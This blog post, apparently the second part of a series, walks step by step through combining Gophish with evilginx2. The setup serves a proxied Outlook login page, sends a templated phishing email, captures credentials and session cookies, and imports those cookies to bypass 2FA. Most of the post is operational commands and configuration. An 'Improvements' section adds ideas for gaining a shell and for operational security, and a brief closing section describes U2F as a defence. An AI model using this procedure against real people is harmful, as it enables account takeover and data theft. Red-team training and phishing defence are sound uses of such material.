---
title: Passing the Phish II
subtitle: Integrating Gophish & Evilginx for Session Hijacking and Bypassing 2FA Authentication
author: Babligan
date: 2019-08-11 00:34:00 +0800
categories: [Infra]
tags: [smtp, phishing, postfix]
---

#### 3. Installing and Running evilginx2

Now that we've setup Gophish, next we'll setup evilginx which will capturee the credentials from our targets.

We will install evilginx on the second server. The official usage and installation of evilginx are available on the tool's official [Github project page](https://github.com/kgretzky/evilginx2). Before installing evilginx, we have to install Go of at least version 1.14.0.

To do so, follow these steps:

```shell
wget https://golang.org/dl/go1.16.5.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.16.5.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
source $HOME/.profile
```

Finally verify that you have GO installed.

```shell
go version
```

When you have GO installed, type in the following:

```shell
sudo apt-get -y install git make
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
```

If you get this error, export the PATH variable again and reload bash.
![[error.png]](/assets/img/gophish/error.png)

Now that we have evilginx installed, let's run it. To do so run:

```shell
sudo ./bin/evilginx -p ./phishlets/
```

**IMPORTANT:** Ensure that there's no service running on ports TCP 443, TCP 80 and UDP 53. You may need to shutdown apache or nginx and any service used for resolving DNS that may be running. evilginx2 will tell you on launch if it fails to open a listening socket on any of these ports.
![[first-run.png]](/assets/img/gophish/first-run.png)

If you get this error, you'll want to check what service is using port 53 (it should be your default DNS resolver, so we just need to stop it and let evilginx run it's own in-built DNS server.)

```shell
sudo lsof -i :53
```

![[lsof.png]](/assets/img/gophish/lsof.png)

Then we'll stop it either by stopping the service or killing it using its PID then edit the resolv.conf file to use Google's DNS servers. If the echo command doesn't work, use nano or vim instead.

```shell
sudo systemctl stop systemd-resolved
rm /etc/resolv.conf
echo 'nameserver 8.8.8.8' > /etc/resolv.conf
```

When we restart evilginx, it should be fine.
![[second-run.png]](/assets/img/gophish/second-run.png)

The next step is the configuration of Evilginx. You have to specify the domain name and the IP address of your server:

```shell
config domain domain-name.com
config ip 1.2.3.4
```

![[config.png]](/assets/img/gophish/config.png)

Evilginx creates phishing links using phishlets. A phishlet is a YAML file that contains configuration to phish a specific website. You can access all the pre-defined phishlets at `/evilginx/phishlets` or you could view the available phishlets by typing `phishlets`.

![[phishlets.png]](/assets/img/gophish/phishlets.png)

To activate a phishlet, run the following command:
`phishlets hostname <phishlet> <hostname>` where the hostname is our domain. In our case, we want to use the outlook phishet. Therefore:

```shell
phishlets hostname outlook domain-name.com
```

![[activate.png]](/assets/img/gophish/activate.png)

For Evilginx to work correctly as a proxy, you will also have to configure the same sub-domains. To know which sub-domains are required, type:

```shell
phishlets get-hosts outlook
```

![[gethosts.png]](/assets/img/gophish/gethosts.png)

We have 3 subdomains to register: outlook, login and account. We'll register these using CNAME records on our domain registrar. On our hosting site (I'm using namechep, but the configuration is usually the same across registrars), we'll register 4 DNS records. The first will be an A record which points to the IP address of our VPS and the rest will be CNAME records for our sub-domains. One thing to note here, we don’t need to copy the `domain-name.com` part, we just need the preceding string.

![[dns.png]](/assets/img/gophish/dns.png)

Once your records have resolved (it usually takes less than 3 minutes or you could confirm with [DNSChecker](https://dnschecker.com)), we can continue with enabling our phish. To do so we run:

```shell
phishlets enable outlook
```

When enabling a phishlet, Evilginx will try to request SSL certificates from LetsEncrypt for the different sub-domains.

![[enable.png]](/assets/img/gophish/enable2.png)

Now that our phish is enabled, we'll generate a lure which is basically the link that a target clicks on. The lures have to be attached with our desired phishlet and a redirect has to be set to point towards the legitimate website that we are trying to harvest credentials for, otherwise they'll be rickrolled.

```shell
lures create outlook
lures edit 0 redirect_url https://outlook.live.com/owa/?nlp=1
lures get-url 0
```

![[lures.png]](/assets/img/gophish/lures2.png)

If you wanted to change the hostname of your lure you'd use one of the subdomains that we registered and set it as follows:

```shell
lures edit 0 hostname login.domain-name.com
```

Then you can go head and get the URL associated with the new hostname.

```shell
lures get-url 0
```

Once a target clicks on our URL, they will be sent to our phishlet. And when they enter the correct credentials, we can capture them and redirect them to the right location.

![[creds.png]](/assets/img/gophish/creds2.png)

Now that we've verified that everything works, let's tie it all together. The captured token can be imported into a browser with the EditThisCookie extension for example. By adding the cookie, the authentication is completely bypassed (even the 2FA) and the attacker has a complete access to the victim's account.

![[sessions2.png]](/assets/img/gophish/sessions2.png)

#### 4. Create and Deploy our Phish

Back to Gophish's email template and now we can craft the email we want to send our target. I'll use a simple template from [crigg626 Github repo](https://github.com/criggs626/PhishingTemplates). I'll use the [Webmail Upgrade](https://github.com/criggs626/PhishingTemplates/blob/master/emails/Upgrade%20Webmail.html) template but feel free to use whichever one.
![[final-template.png]](/assets/img/gophish/final-template.png)

Just to make sure that it would land, I edited the href tag in the HTML code to point to our evilginx link.
![[href.png]](/assets/img/gophish/href.png)

To integrate our evilginx link, we'll edit our Landing page and import the link.
![[final-landing.png]](/assets/img/gophish/final-landing.png)
![[import.png]](/assets/img/gophish/import.png)

After we've checked that all sections have been filled correctly, we can finally launch our campaign.
![[final-campaign.png]](/assets/img/gophish/final-campaign.png)

When we check our email, we find it. Yay!
![[email.png]](/assets/img/gophish/email.png)

When we click the link it opens a new tab, which is the outlook login page we had setup with evilginx. (you might have to clear your browser cache or use a different browser entirely). We sign in with some dummy creds and we are able to retrieve them on our evilginx server.

![[redirect.png]](/assets/img/gophish/redirect.png)
![[sessions.png]](/assets/img/gophish/sessions.png)

### Improvements

1. To make the phishing email even more effective, you can choose to integrate it with a technique that is able to yield a shell. XSS, Maldocs, CSRF, HTML smuggling and many others can work.
2. For OPSEC, it is best to use infrastructure that you have complete control over. So, instead of using SendGrid, you can use your own mail server.
3. Ensure that you use TLS on **ALL** your phishing infrastructure which includes Gophish's listening server.

### Mitigation

1. For this type of attack, the primary defense would always be exercising a little bit of paranoia. **Always check the legitimacy of the domain that's visible on the address bar.**
2. However, this wouldn't be enough for big companies as it just requires one  user to submit their correct credetials and just like that attackers are able to steal large amounts of data. This is where U2F for unphishable 2nd factor authentication comes in. It uses a physical hardware that you plug into a USB port and you just press a button when the website asks you to. The U2F protocol is designed to take the website's domain as one of the key components in negotiating the handshake. This means that if the domain in the browser's address bar, does not match the domain used in the data transmission between the website and the U2F device, the communication will simply fail. This solution leaves no room for error and is totally unphishable using Evilginx method.

I hope you've learnt one or two things from this article. Be sure to check out these resources. If you have any questions, or if there'somethng I might have missed out, feel free to DM me on [Twitter](https://twitter.com/babligan).

- <https://breakdev.org/evilginx-2-next-generation-of-phishing-2fa-tokens/>
- <https://babligan.github.io/posts/smtp-relaying-for-phishing/>
